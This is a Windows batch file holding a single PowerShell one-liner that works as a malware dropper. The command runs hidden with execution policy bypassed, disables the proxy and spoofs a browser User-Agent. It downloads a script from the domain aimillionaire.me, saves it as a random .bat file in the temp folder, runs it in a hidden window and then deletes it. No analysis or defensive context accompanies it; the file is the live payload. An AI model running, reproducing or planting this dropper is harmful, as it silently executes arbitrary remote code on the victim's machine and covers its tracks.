@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "function e{param([string]$u)try{$b=[System.IO.Path]::GetTempPath()+[System.Guid]::NewGuid().ToString()+'.bat';$c=New-Object System.Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)');$c.Proxy=$null;$s=$c.DownloadString($u);$c.Dispose();if(![string]::IsNullOrWhiteSpace($s)){[System.IO.File]::WriteAllText($b,$s,[System.Text.Encoding]::UTF8);$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=$b;$p.StartInfo.UseShellExecute=$true;$p.StartInfo.WindowStyle='Hidden';$p.Start();Start-Sleep -Seconds 2;if(Test-Path $b){Remove-Item $b -Force}return $true}}catch{}return $false};e -u 'https://aimillionaire.me'"
